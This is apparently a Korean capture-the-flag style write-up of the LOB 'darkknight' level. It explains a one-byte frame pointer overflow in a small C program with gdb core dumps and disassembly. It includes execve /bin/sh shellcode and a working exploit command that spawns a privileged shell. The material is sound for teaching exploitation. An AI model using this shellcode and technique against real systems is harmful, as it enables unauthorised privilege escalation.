---
title: "[LOB]Level12. darkknight"
tags: [Wargame, LOB, Write-up]
author: eli_ez3r
key: 20180830
modify_date: 2018-08-30
article_header:
  type: cover
  image:
    src: 
---

[SFP](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/
#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

-----

### 0x01. Analysis

problem_child 함수를 보면 41바이트만 복사하게 된다.

힌트에 나왔듯이 SFP주소에 1바이트만 Overflow 시킬수 있는 공격이 FPO(Frame Pointer Overflow) 공격이다.

SPF의 1바이트를 변경시키면 근처 스택 주소로 SFP를 변조 시킬 수 있다.



실제 올라가게 되는 problem_child의 buffer배열 주소를 구해보자.

```sh
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"S"*36+"\x80"'`
AAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -c core
Core was generated by `./aarkknight AAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/32x $esp-4
0xbffffc84:     0x41414141      0x53535353      0x53535353      0x53535353
0xbffffc94:     0x53535353      0x53535353      0x53535353      0x53535353
0xbffffca4:     0x53535353      0x53535353      0xbffffc80      0x0804849e
0xbffffcb4:     0xbffffe06      0xbffffcd8      0x400309cb      0x00000002
0xbffffcc4:     0xbffffd04      0xbffffd10      0x40013868      0x00000002
0xbffffcd4:     0x08048390      0x00000000      0x080483b1      0x0804846c
0xbffffce4:     0x00000002      0xbffffd04      0x080482e4      0x080484dc
0xbffffcf4:     0x4000ae60      0xbffffcfc      0x40013e90      0x00000002
```

problem_child의 buffer배열의 시작주소는 `0xbffffc84`로 확인되고 있다.

이제 우리는 problem_child함수의 sfp 1byte를 바꿀수 있는 것을 이용하여 공격을 해야한다.



여기서 스택주소로 변경시킬 때 중요한 점은 SFP에 [원하는 주소-4] 주소를 넣어야 된다는 점이다.

그 이유는 함수가 끝날 때, leave - ret 순서로 종료하게 되게 때문이다.

> leave 명령어는 `mov esp, ebp`, `pop ebp` 순으로 진행되고, 
>
> ret 명령어는 `pop eip`, `jmp eip` 순으로 진행된다.
>
> 자세한 내용 설명은 맨 하단으로~

그리고 problem_child의 buffer배열의 시작부분에 shellcode가 실행될 주소를 넣어주면 된다.

-----

### 0x02. Exploit

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```sh
[golem@localhost golem]$ ./darkknight `python -c 'print "\x88\xfc\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x 68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x80"'`
덡퓧릱릱릱릱릱?픐h//shh/bin됥PS됣솻
                                     ??퓹?  ♠?왠?옹    ♥@☻
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```

-----

일단 main함수에서 problem_child를 호출하고 buffer배열 공간을 할당하게 되었을 때에 스택의 구조는 다음과 같다.

<img src="2018-08-30-writeup-lob-12.darkknight.assets/1571194023817.png" width="300px">

```
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"\x90"*12+"S"*24+"C"'`
AAAA릱릱릱릱릱릱SSSSSSSSSSSSSSSSSSSSSSSSC?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
```

실제 buffer배열에 A 4개와 NOP Code 12개, 그리고 Shell Code가 들어갈 공간 24byte를 넣어주고 마지막에 "C" 값을 넣어 core를 떨어뜨렸다.

```
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAA릱릱릱릱릱릱SSSSSSSSSSSSSSSSSSSSSSSSC'.
Program terminated with signal 11, Segmentation fault.
#0  0xa970bf in ?? ()
(gdb) x/x $esp
0xbffffc4b:     0xfffe2f40
(gdb) x/32x $esp-4
0xbffffc47:     0x00a970bf      0xfffe2f40      0xfffcacbf      0x05d920bf
0xbffffc57:     0x0143e040      0xfffc7440      0x066070bf      0x10698040
0xbffffc67:     0x04850040      0xfffc8408      0x1081ecbf      0xfffcac40
0xbffffc77:     0x048466bf      0x04850008      0xfffc8408      0x414141bf
0xbffffc87:     0x90909041      0x90909090      0x90909090      0x53535390
0xbffffc97:     0x53535353      0x53535353      0x53535353      0x53535353
0xbffffca7:     0x53535353      0xfffc4353      0x04849ebf      0xfffe0608
0xbffffcb7:     0xfffcd8bf      0x0309cbbf      0x00000240      0xfffd0400
```

core dump를 확인해보면 흥미로운 사실을 확인 할 수 있다.

일단 `0x00a980bf` 의 주소를 모르겠다는 메시지가 나타난다.

그리고 esp 주소가 `0xbffffc4b` 이다. 그리고 esp-4 주소를 보면 `0x00a980bf` 라는 주소가 있다.  eip가 이 주소를 가리키기 때문에 Segmentation fault가 뜬것이다.

지금은 이게 무슨 말인가 싶을 수 있다. 이 내용을 머릿속에 잘 기억하고 메모리 구조를 다시 살펴보자.

```assembly
(gdb) disas problem_child
Dump of assembler code for function problem_child:
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %ebp,%esp
0x8048443 <problem_child+3>:    sub    %esp,40
0x8048446 <problem_child+6>:    push   41
0x8048448 <problem_child+8>:    mov    %eax,DWORD PTR [%ebp+8]
0x804844b <problem_child+11>:   push   %eax
0x804844c <problem_child+12>:   lea    %eax,[%ebp-40]
0x804844f <problem_child+15>:   push   %eax
0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
0x8048455 <problem_child+21>:   add    %esp,12
0x8048458 <problem_child+24>:   lea    %eax,[%ebp-40]
0x804845b <problem_child+27>:   push   %eax
0x804845c <problem_child+28>:   push   0x8048500
0x8048461 <problem_child+33>:   call   0x8048354 <printf>
0x8048466 <problem_child+38>:   add    %esp,8
0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret
0x804846b <problem_child+43>:   nop
End of assembler dump.
```



